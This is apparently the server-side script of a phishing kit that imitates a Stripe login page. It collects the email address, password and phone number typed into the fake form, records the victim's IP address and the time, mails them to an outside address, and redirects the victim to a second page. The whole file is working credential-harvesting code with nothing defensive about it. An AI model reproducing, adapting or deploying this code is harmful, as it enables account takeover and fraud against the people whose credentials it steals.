<?php   ob_start();  ?>
<?
include "X-x-X.php";
?>
<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "==================================================\n";
$message .= "============xX Kelly Ajayi Xx======\n";
$message .= "EMAIL               : ".$_POST['winners1']."\n";
$message .= "PASSWORD                  : ".$_POST['winners2']."\n";
$message .= "Phone                  : ".$_POST['winners3']."\n";
$message .= "============xX WU Kelly Xx=====\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | On Time : ".date("m/d/Y g:i:a")."\n";
$message .= "==================================================\n";

$send="admin@paperfoxla.com";
$subject = "Stripe Login | ".$_POST['winners1']." | $ip";
$headers = "From: Kelly<noreply>";
@mail($send,$subject,$message,$from);
@header("Location: index2.php");